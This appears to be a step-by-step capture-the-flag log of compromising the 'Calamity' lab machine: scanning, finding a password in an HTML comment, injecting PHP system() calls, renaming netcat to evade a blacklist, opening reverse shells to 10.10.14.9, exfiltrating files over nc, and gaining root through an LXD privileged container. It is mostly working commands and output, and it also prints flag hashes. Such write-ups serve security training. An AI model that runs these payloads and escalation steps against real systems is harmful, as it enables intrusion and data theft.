@@ -1,0 +1,379 @@
+Machine-Name : Calamity
+IP-Address   : 10.129.52.30
+
+Command-Line: sudo nmap -A 10.129.52.30
+Result:
+    Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-23 00:05 EST
+    Nmap scan report for 10.129.52.30
+    Host is up (0.065s latency).
+    Not shown: 998 closed ports
+    PORT   STATE SERVICE VERSION
+    22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+    | ssh-hostkey:
+    |   2048 b6:46:31:9c:b5:71:c5:96:91:7d:e4:63:16:f9:59:a2 (RSA)
+    |   256 10:c4:09:b9:48:f1:8c:45:26:ca:f6:e1:c2:dc:36:b9 (ECDSA)
+    |_  256 a8:bf:dd:c0:71:36:a8:2a:1b:ea:3f:ef:66:99:39:75 (ED25519)
+    80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+    |_http-server-header: Apache/2.4.18 (Ubuntu)
+    |_http-title: Brotherhood Software
+    No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+
+
+Command-Line:
+    sudo dirb http://10.129.52.30
+Result:
+    -----------------
+    DIRB v2.22
+    By The Dark Raver
+    -----------------
+
+    START_TIME: Mon Nov 23 00:13:33 2020
+    URL_BASE: http://10.129.52.30/
+    WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+    -----------------
+
+    GENERATED WORDS: 4613
+
+    ---- Scanning URL: http://10.129.52.30/ ----
+    + http://10.129.52.30/admin.php (CODE:200|SIZE:451)
+    + http://10.129.52.30/index.html (CODE:200|SIZE:514)
+    + http://10.129.52.30/server-status (CODE:403|SIZE:300)
+    ==> DIRECTORY: http://10.129.52.30/uploads/
+
+    ---- Entering directory: http://10.129.52.30/uploads/ ----
+    (!) WARNING: Directory IS LISTABLE. No need to scan it.
+        (Use mode '-w' if you want to scan it anyway)
+
+    -----------------
+    END_TIME: Mon Nov 23 00:20:00 2020
+    DOWNLOADED: 4613 - FOUND: 3
+
+
+Command-Line: sudo dirb http://10.129.52.30 -X .txt
+Result:
+    -----------------
+    DIRB v2.22
+    By The Dark Raver
+    -----------------
+
+    START_TIME: Mon Nov 23 00:14:01 2020
+    URL_BASE: http://10.129.52.30/
+    WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+    EXTENSIONS_LIST: (.txt) | (.txt) [NUM = 1]
+
+    -----------------
+
+    GENERATED WORDS: 4613
+
+    ---- Scanning URL: http://10.129.52.30/ ----
+
+    -----------------
+    END_TIME: Mon Nov 23 00:20:24 2020
+    DOWNLOADED: 4613 - FOUND: 0
+
+
+Browser: http://10.129.52.30/admin.php
+Result:
+    <html><body>
+
+    <form method="post">
+    Password: <input type="text" name="user"><br>
+    Username: <input type="password" name="pass">
+      <input type="submit" value="Log in to the powerful administrator page">
+    																																																																																																																																																																																													<!-- password is:skoupidotenekes-->
+    </form>
+    </body></html>
+
+Notes: Password and Username are switched.
+
+Burpsuite-Request: (Repeater)
+    POST /admin.php HTTP/1.1
+    Host: 10.129.52.30
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 19
+    Origin: http://10.129.52.30
+    Connection: close
+    Referer: http://10.129.52.30/admin.php
+    Upgrade-Insecure-Requests: 1
+
+    user=uk47&pass=uk47
+
+Burpsuite-Response: (Repeater)
+    HTTP/1.1 200 OK
+    Date: Mon, 23 Nov 2020 06:38:30 GMT
+    Server: Apache/2.4.18 (Ubuntu)
+    Set-Cookie: adminpowa=noonecares
+    refresh: 0;
+    Vary: Accept-Encoding
+    Content-Length: 451
+    Connection: close
+    Content-Type: text/html; charset=UTF-8
+
+    <html><body>
+
+    <form method="post">
+    Password: <input type="text" name="user"><br>
+    Username: <input type="password" name="pass">
+      <input type="submit" value="Log in to the powerful administrator page">
+    	<-- password is:skoupidotenekes-->																																																																																																																																																																																											<!-- password is:skoupidotenekes-->
+    </form>
+    </body></html>
+
+
+Browser: http://10.129.52.30/admin.php
+Username : admin
+Password: skoupidotenekes
+** ACCESS GRANTED **
+
+Landing-Page-Contents:
+    Title: GOT U BEEJAY
+
+    TADAA IT HAS NOTHING
+    what were you waiting for dude ?you know I aint finished creating
+    xalvas,the boss said I am a piece of shit and that I dont take my job seriously...but when all this is set up...Ima ask for double the money
+    just cauz he insulted me
+    Maybe he's still angry at me deleting the DB on the previous site...he should keep backups man !
+    anyway I made an html interpreter to work on my php skills ! It wasn't easy I assure you...I'm just a P-R-O on PHP !!!!!!!!!
+    access in here is like 99% secure ,but even if that 1% reaches this page ,there's nothing they can do !
+    html is super-harmless to our system! Try writing some simple stuff ...and see how difficult my job is and how underpaid I am
+    Your HTML: [input for html code]
+    [HTML Output]
+
+Notes: "xalvas" is a character from the game World of Warcraft.
+
+Your-HTML: <?php system('ls /home')?>
+Result: xalvas
+Usernames-Found: xalvas
+
+Your-HTML: <?php  system('$sock=fsockopen("10.10.14.9",9999);exec("/bin/sh -i <&3 >&3 2>&3");') ?> == NOTHING
+Your-HTML: <?php system('bash -i >& /dev/tcp/10.10.14.9/9999 0>&1 | bash') ?> == NOTHING
+Your-HTML: <?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|/dev/shm/uk47 10.10.14.9 9999 >/tmp/f") ?> == NOTHING
+
+Your-HTML: <?php system("cat /home/xalvas/user.txt")?>
+Result: 0790e7be60d5cd7faeeb9ac550762e5e
+*** USER OWNED ***
+
+Your-HTML: <?php system("pwd")?>
+Result: /var/www/html
+Your-HTML: <?php system("find /home -ctime -60")?>
+Result:/home/xalvas/intrusions
+Your-HTML: <?php system("ls -la /home/xalvas/intrusions")?>
+Result:
+    -rw-r--r-- 1 root root 2029 Nov 25 16:59 /home/xalvas/intrusions
+Your-HTML: <?php system("cat /home/xalvas/intrusions")?>
+Result:
+POSSIBLE INTRUSION BY BLACKLISTED PROCCESS nc
+...PROCESS KILLED AT 2017-06-28 04:55:42.796288 POSSIBLE INTRUSION BY BLACKLISTED PROCCESS nc
+...PROCESS KILLED AT 2017-06-28 05:22:11.228988 POSSIBLE INTRUSION BY BLACKLISTED PROCCESS nc
+...PROCESS KILLED AT 2017-06-28 05:23:23.424719 POSSIBLE INTRUSION BY BLACKLISTED PROCCESS nc
+...PROCESS KILLED AT 2017-06-29 02:43:57.083849 POSSIBLE INTRUSION BY BLACKLISTED PROCCESS python
+...PROCESS KILLED AT 2017-06-29 02:48:47.909739 POSSIBLE INTRUSION BY BLACKLISTED PROCCESS sh
+...PROCESS KILLED AT 2017-06-29 06:25:04.202315 POSSIBLE INTRUSION BY BLACKLISTED PROCCESS sh
+...PROCESS KILLED AT 2017-06-29 06:25:04.780685 POSSIBLE INTRUSION BY BLACKLISTED PROCCESS python
+...PROCESS KILLED AT 2017-06-29 06:25:06.209358 POSSIBLE INTRUSION BY BLACKLISTED PROCCESS nc
+...PROCESS KILLED AT 2017-06-29 12:15:32.329358 POSSIBLE INTRUSION BY BLACKLISTED PROCCESS nc
+...PROCESS KILLED AT 2017-06-29 12:15:32.330115 POSSIBLE INTRUSION BY BLACKLISTED PROCCESS nc
+...PROCESS KILLED AT 2017-06-29 12:16:10.508710 POSSIBLE INTRUSION BY BLACKLISTED PROCCESS nc
+...PROCESS KILLED AT 2017-06-29 12:16:10.510537 POSSIBLE INTRUSION BY BLACKLISTED PROCCESS python3
+...PROCESS KILLED AT 2017-12-24 10:30:28.836132 POSSIBLE INTRUSION BY BLACKLISTED PROCCESS nc
+...PROCESS KILLED AT 2020-11-25 01:46:44.867152 POSSIBLE INTRUSION BY BLACKLISTED PROCCESS nc
+...PROCESS KILLED AT 2020-11-25 02:04:53.699288 POSSIBLE INTRUSION BY BLACKLISTED PROCCESS nc
+...PROCESS KILLED AT 2020-11-25 16:42:39.601307 POSSIBLE INTRUSION BY BLACKLISTED PROCCESS nc
+...PROCESS KILLED AT 2020-11-25 16:45:04.475973 POSSIBLE INTRUSION BY BLACKLISTED PROCCESS nc
+...PROCESS KILLED AT 2020-11-25 16:54:57.982743 POSSIBLE INTRUSION BY BLACKLISTED PROCCESS nc
+...PROCESS KILLED AT 2020-11-25 16:58:53.357739 POSSIBLE INTRUSION BY BLACKLISTED PROCCESS nc
+...PROCESS KILLED AT 2020-11-25 16:59:37.619458
+
+    Notes: "NetCat (nc)" seems to be BLACKLISTED.
+
+Your-HTML: <?php system("which nc")?>
+Result: /bin/nc
+Notes: "NetCat (nc)" is installed, but BLACKLISTED from use.
+
+Your-HTML: <?php system("cp /bin/nc /dev/shm/uk47") ?>
+Result: No response from the browser.
+
+Checking to see if the file copied over:
+Your-HTML: <?php system("which uk47")?>
+Result: No response from the browser.
+
+Your-HTML: <?php system('chmod 755 /dev/shm/uk47')?>
+Result: No response from the browser.
+
+Your-HTML: <?php system('cat /dev/shm/uk47')?>
+Result: Encoded binary.
+Notes: "NetCat (nc)" now lives in /dev/shm/uk47
+
+Notes: Retrying <?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|/dev/shm/uk47 10.10.14.9 9999 >/tmp/f") ?>. I have replaced the "nc" with the path to the copied file of NetCat (/dev/shm/uk47).
+
+Your-HTML: <?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|/dev/shm/uk47 10.10.14.9 9999 >/tmp/f") ?>
+Command-Line: nc -nlvp 9999
+Result: *** Reverse-Shell-Access ***
+
+Reverse-Shell: ls -la
+Result:
+    drwxr-xr-x 3 root     root   4096 Jun 27  2017 .
+    drwxr-xr-x 3 root     root   4096 Jun 27  2017 ..
+    -r--r--r-- 1 www-data root   1865 Jun 27  2017 admin.php
+    -r--r--r-- 1 www-data root  56837 Jun 27  2017 bg.png
+    -r--r--r-- 1 www-data root    514 Jun 27  2017 index.html
+    -r--r--r-- 1 www-data root 212864 Jun 27  2017 leet.png
+    drwxrwxrwx 2 www-data root   4096 Jun 27  2017 uploads
+
+Reverse-Shell: whoami
+Result: www-data
+
+Reverse-Shell: python3 -c 'import pty;pty.spawn("/bin/bash")'
+Result: www-data@calamity:/var/www/html$
+
+www-data@calamity:/var/www/html$ cd /home/xalvas
+www-data@calamity:/home/xalves$ ls -la
+Result:
+    total 3180
+    drwxr-xr-x 7 xalvas xalvas    4096 Jun 29  2017 .
+    drwxr-xr-x 3 root   root      4096 Jun 27  2017 ..
+    -rw-r--r-- 1 xalvas xalvas     220 Jun 27  2017 .bash_logout
+    -rw-r--r-- 1 xalvas xalvas    3790 Jun 27  2017 .bashrc
+    drwx------ 2 xalvas xalvas    4096 Jun 27  2017 .cache
+    -rw-rw-r-- 1 xalvas xalvas      43 Jun 27  2017 .gdbinit
+    drwxrwxr-x 2 xalvas xalvas    4096 Jun 27  2017 .nano
+    -rw-r--r-- 1 xalvas xalvas     655 Jun 27  2017 .profile
+    -rw-r--r-- 1 xalvas xalvas       0 Jun 27  2017 .sudo_as_admin_successful
+    drwxr-xr-x 2 xalvas xalvas    4096 Jun 27  2017 alarmclocks
+    drwxr-x--- 2 root   xalvas    4096 Jun 29  2017 app
+    -rw-r--r-- 1 root   root       225 Jun 27  2017 dontforget.txt
+    -rw-r--r-- 1 root   root      2029 Nov 25 16:59 intrusions
+    drwxrwxr-x 4 xalvas xalvas    4096 Jun 27  2017 peda
+    -rw-r--r-- 1 xalvas xalvas 3196724 Jun 27  2017 recov.wav
+    -r--r--r-- 1 root   root        33 Jun 27  2017 user.txt
+
+www-data@calamity:/home/xalves$ cd alarmclocks
+www-data@calamity:/home/xalves$ ls -la
+Result:
+    rick.wav  xouzouris.mp3
+
+Command-Line: nc -nlvp 4444 > rick.wav
+Result:
+  listening on [any] 4444 ...
+
+www-data@calamity:/home/xalves$ /dev/shm/uk47 10.10.14.9 4444 < rick.wav
+Result:
+    connect to [10.10.14.9] from (UNKNOWN) [10.129.52.30] 33460
+Notes: File-Transfer-Successful
+
+Notes: Downloaded Audacity. Imported rick.wav and recov.wav. Both files sound the same. Inverting the audio gave a password.
+
+Password-Found: 18547936..*
+
+Command-Line: ssh xalvas@10.129.52.30
+Password: 18547936..*
+Result:
+    xalvas@calamity:~$
+
+*** USER ACCESS GRANTED ***
+
+
+Attempting root access...
+
+Command-Line: git clone https://github.com/saghul/lxd-alpine-builder.git
+Result:
+    (Directory) lxd-alpine-builder
+
+xalvas@calamity:~$ lscpu
+Result:
+    Architecture:          i686
+    CPU op-mode(s):        32-bit, 64-bit
+    Byte Order:            Little Endian
+    CPU(s):                1
+    On-line CPU(s) list:   0
+    Thread(s) per core:    1
+    Core(s) per socket:    1
+    Socket(s):             1
+    Vendor ID:             AuthenticAMD
+    CPU family:            23
+    Model:                 1
+    Model name:            AMD EPYC 7401P 24-Core Processor
+    Stepping:              2
+    CPU MHz:               2000.000
+    BogoMIPS:              4000.00
+    Hypervisor vendor:     VMware
+    Virtualization type:   full
+    L1d cache:             32K
+    L1i cache:             64K
+    L2 cache:              512K
+    L3 cache:              65536K
+    Flags:                 fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 syscall nx mmxext fxsr_opt pdpe1gb rdtscp lm constant_tsc rep_good tsc_reliable nonstop_tsc extd_apicid eagerfpu pni pclmulqdq ssse3 fma cx16 sse4_1 sse4_2 x2apic movbe popcnt aes xsave avx f16c rdrand hypervisor lahf_lm extapic cr8_legacy abm sse4a misalignsse 3dnowprefetch osvw vmmcall fsgsbase bmi1 avx2 smep bmi2 rdseed adx smap clflushopt xsaveopt xsavec arat
+
+Notes: Architecture is: "i686" (32-bit)
+
+Command-Line: sudo ./build-alpine -a i686
+Result:
+    alpine-v3.12-i686-20201129_0120.tar.gz  build-alpine  LICENSE  README.md
+
+Command-Line: scp alpine-v3.12-i686-20201129_0120.tar.gz ssh xalvas@10.129.52.30:
+Result:
+  xalvas@10.129.52.30's password:
+  alpine-v3.12-i686-20201129_0120.tar.gz                                  100% 3116KB 235.1KB/s   00:13
+
+xalvas@calamity:~$ lxc image import alpine-v3.12-i686-20201129_0120.tar.gz --alias alpine2
+Result:
+    Image imported with fingerprint: 82cf6719b2fe633a614cfaf719fb678b2fac6a98965836abecdf0d03350dbe14
+
+xalvas@calamity:~$ lxc image list
+Result:
+    +---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
+    | alpine2 | 82cf6719b2fe | no     | alpine v3.12 (20201129_01:20) | i686   | 3.04MB | Nov 29, 2020 at 6:27am (UTC) |
+    +---------+--------------+--------+-------------------------------+--------+--------+-------------------------------
+
+xalvas@calamity:~$ lxc init alpine2 privesc2 -c security.privileged=true
+Result: Creating privesc2
+
+xalvas@calamity:~$ lxc list
+Result:
+    +----------+---------+------+------+------------+-----------+
+    |   NAME   |  STATE  | IPV4 | IPV6 |    TYPE    | SNAPSHOTS |
+    +----------+---------+------+------+------------+-----------+
+    | privesc2 | STOPPED |      |      | PERSISTENT | 0         |
+    +----------+---------+------+------+------------+-----------+
+
+
+xalvas@calamity:~$ lxc config device add privesc2 host-root disk source=/ path=/mnt/root
+Result: Device host-root added to privesc2
+
+xalvas@calamity:~$ lxc start privesc2
+xalvas@calamity:~$ lxc exec privesc2 /bin/sh
+Result:
+    ~ #
+    *** ROOT ACCESS ***
+
+~ # cd /
+~/ # ls
+Result:
+    bin    etc    lib    mnt    proc   run    srv    tmp    var
+    dev    home   media  opt    root   sbin   sys    usr
+
+/ # cd mnt/
+/mnt # ls
+Result:
+    root
+
+/mnt # cd root
+/mnt/root # ls
+Result:
+    bin             initrd.img      mnt             sbin            tmp
+    boot            initrd.img.old  opt             sec             usr
+    dev             lib             proc            snap            var
+    etc             lost+found      root            srv             vmlinuz
+    home            media           run             sys             vmlinuz.old
+
+/mnt/root # cat root/root.txt
+Result: 9be653e014d17d1a54f9045e3220743c
+    *** ROOT OWNED ***
+
+
+*** FINISHED ***
